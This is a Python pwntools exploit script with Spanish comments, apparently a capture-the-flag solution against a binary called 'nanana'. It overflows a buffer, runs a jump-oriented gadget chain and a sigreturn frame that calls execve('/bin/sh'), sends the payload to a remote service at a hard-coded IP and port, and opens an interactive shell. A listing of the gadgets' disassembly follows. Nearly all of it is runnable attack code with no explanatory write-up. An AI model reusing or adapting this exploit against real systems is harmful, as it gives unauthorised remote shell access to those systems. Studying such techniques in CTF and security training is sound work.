from pwn import *
from time import sleep

#### seteo inicial y GDB ####
context.clear(arch="amd64")
gdbscript = '''
break *0x00400107
continue
'''

#### ADDRESS Y GADGETS ####
data = 0x600124
dispatcher = 0x00400107
binsh = "/bin/sh\x00"
syscall = 0x400105

#### ARMANDO PAYLOAD ####

payload = (cyclic(256))
payload += p64(0x400115) #pop rcx, rsi y rdx
payload += p64(dispatcher)#seteando el dispatcher a rxc
payload += p64(0x400114)#pop
payload += p64(data)#rsi #seteando la direccion de .data  rsi
payload += p64(0x8)#seteando el valor de RDX a 8, para luego usarlo como llamada de read (size)
payload += p64(0x4000ff)#llamando a read de nuevo
payload += p64(0x400119)#add eax 0x7 para completar 0xf y llamar a sigreturn
payload += p64(syscall)# syscall a sigreturn

###construyendo el frame de sigreturn con magia de pwntools ###
frame = SigreturnFrame(kernel="amd64")
### armando el frame para llamar a execve() ###
frame.rax = 0x3b
frame.rdi = data
frame.rsi = 0 
frame.rdx = 0
frame.rip = syscall

payload += str(frame)

#r = gdb.debug('./nanana', gdbscript)
#r = process('./nanana')
r = remote('172.104.234.7', 7891)
### enviando primer payload ####
r.sendline(payload)
sleep(1)
#### enviando segundo payload ####
r.sendline(binsh)# instrucciones a .data

r.interactive()

### GADGETS ####
'''
  4000f0:	48 89 e6             	mov    rsi,rsp
  4000f3:	48 81 ee 00 01 00 00 	sub    rsi,0x100
  4000fa:	ba 50 02 00 00       	mov    edx,0x250
  4000ff:	48 31 c0             	xor    rax,rax
  400102:	48 31 ff             	xor    rdi,rdi
  400105:	0f 05                	syscall

  400107:	48 83 c4 08          	add    rsp,0x8
  40010b:	ff 64 24 f8          	jmp    QWORD PTR [rsp-0x8]
  
  40010f:	59                   	pop    rcx
  400110:	48 83 c1 00          	add    rcx,0x0
  400114:	5e                   	pop    rsi
  400115:	5a                   	pop    rdx
  400116:	90                   	nop
  400117:	ff e1                	jmp    rcx
  
  400119:	48 83 c0 07          	add    rax,0x7
  40011d:	48 89 c6             	mov    rsi,rax
  400120:	ff e1                	jmp    rcx
  
'''


